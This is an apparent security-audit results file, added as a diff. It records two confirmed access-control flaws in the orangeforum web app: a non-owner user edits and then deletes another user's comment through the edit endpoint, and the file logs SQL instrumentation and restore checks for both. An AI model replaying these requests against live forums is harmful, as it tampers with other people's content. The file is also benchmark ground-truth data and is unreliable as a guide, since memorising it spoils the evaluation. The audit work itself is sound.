@@ -1,0 +1,147 @@
+{
+  "app": "orangeforum",
+  "baseline": "D:\\project\\python\\DRHL\\ground_truth\\audit\\orangeforum\\evidence\\baseline.sql",
+  "database_restored_after_each_record": true,
+  "restore_verified_per_record": [
+    true,
+    true
+  ],
+  "restore_note": "postgresql re-normalizes plpgsql function bodies on restore, so per-row probes are used instead of a full dump comparison",
+  "results": [
+    {
+      "gt_id": "GT-049",
+      "app": "orangeforum",
+      "verified_at": "2026-09-06T14:11:44.220433+00:00",
+      "verdict": "vulnerable",
+      "summary": "user1 GET categories/1/topics/9/comments/34/edit returned 200 with the edit form of user2's comment (content token exposed=True); the Update POST returned 303 and changed the comment content DRHLGT_c34_before_8703903437 -> DRHLGT_c34_after_8703903437 (updated=True).",
+      "sql_statements": [
+        {
+          "kind": "psql",
+          "sql": "SELECT user_id FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT content FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT is_sticky FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "UPDATE comments SET content='DRHLGT_c34_before_8703903437' WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT content FROM comments WHERE comment_id=34"
+        }
+      ],
+      "steps": [
+        {
+          "kind": "instrument",
+          "table": "comments",
+          "row": "comment_id=34",
+          "column": "content",
+          "owner_user_id": "3",
+          "token1": "DRHLGT_c34_before_8703903437",
+          "token2": "DRHLGT_c34_after_8703903437",
+          "original_content_recorded": true
+        },
+        {
+          "kind": "replay",
+          "role": "user1 (not the comment owner)",
+          "request": "GET categories/1/topics/9/comments/34/edit",
+          "status_code": 200,
+          "edit_form_exposed_other_users_comment": true,
+          "csrf_token_obtained": true,
+          "body_saved": "GT-049_gt049_user1_edit_form.html"
+        },
+        {
+          "kind": "replay",
+          "role": "user1 (not the comment owner)",
+          "request": "POST categories/1/topics/9/comments/34/edit action=Update content=DRHLGT_c34_after_8703903437",
+          "status_code": 303,
+          "db_content_before": "DRHLGT_c34_before_8703903437",
+          "db_content_after": "DRHLGT_c34_after_8703903437",
+          "updated": true
+        }
+      ],
+      "restore_verified": true
+    },
+    {
+      "gt_id": "GT-050",
+      "app": "orangeforum",
+      "verified_at": "2026-09-06T14:11:45.924684+00:00",
+      "verdict": "vulnerable",
+      "summary": "user1 GET categories/1/topics/9/comments/34/edit returned 200 with the edit form of user2's comment (token exposed=True); the Delete POST returned 303 and removed comment 34 (exists_after=0), with the topic comment counter decremented 5 -> 4.",
+      "sql_statements": [
+        {
+          "kind": "psql",
+          "sql": "SELECT content FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT is_sticky FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT user_id FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT content FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT num_comments FROM topics WHERE topic_id=9"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT num_comments FROM users WHERE user_id=3"
+        },
+        {
+          "kind": "psql",
+          "sql": "UPDATE comments SET content='DRHLGT_c34_delete_8703905223' WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT COUNT(*) FROM comments WHERE comment_id=34"
+        },
+        {
+          "kind": "psql",
+          "sql": "SELECT num_comments FROM topics WHERE topic_id=9"
+        }
+      ],
+      "steps": [
+        {
+          "kind": "instrument",
+          "table": "comments",
+          "row": "comment_id=34",
+          "column": "content",
+          "token": "DRHLGT_c34_delete_8703905223",
+          "owner_user_id": "3",
+          "topic_num_comments_before": "5"
+        },
+        {
+          "kind": "replay",
+          "role": "user1 (not the comment owner)",
+          "request": "GET categories/1/topics/9/comments/34/edit",
+          "status_code": 200,
+          "edit_form_exposed_other_users_comment": true,
+          "csrf_token_obtained": true,
+          "body_saved": "GT-050_gt050_user1_edit_form.html"
+        },
+        {
+          "kind": "replay",
+          "role": "user1 (not the comment owner)",
+          "request": "POST categories/1/topics/9/comments/34/edit action=Delete",
+          "status_code": 303,
+          "comment_exists_after": "0",
+          "deleted": true,
+          "topic_num_comments_after": "4"
+        }
+      ],
+      "restore_verified": true
+    }
+  ]
+}
